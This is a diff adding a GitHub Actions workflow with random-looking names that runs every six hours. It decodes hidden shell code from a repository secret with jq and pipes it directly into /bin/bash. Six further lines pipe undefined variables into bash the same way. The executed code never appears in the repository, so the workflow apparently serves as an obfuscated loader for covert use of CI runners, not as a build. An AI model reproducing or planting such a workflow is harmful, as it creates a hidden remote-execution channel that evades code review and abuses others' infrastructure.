@@ -1,0 +1,24 @@
+name: songjiaoao2580
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '52 1/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: songjiaoao2580
+        env:
+          tas7361: ${{ secrets.tas7361 }}
+        run: |
+          echo $tas7361 | jq -r .ogk20589 | /bin/bash
+          echo $e74 | jq -r .xffh588 | /bin/bash
+          echo $ouaq64 | jq -r .y0 | /bin/bash
+          echo $teje3 | jq -r .mrie04519 | /bin/bash
+          echo $j46761 | jq -r .uirz97738 | /bin/bash
+          echo $pwu1 | jq -r .hdrf0261 | /bin/bash
+          echo $w6 | jq -r .piso848 | /bin/bash
+
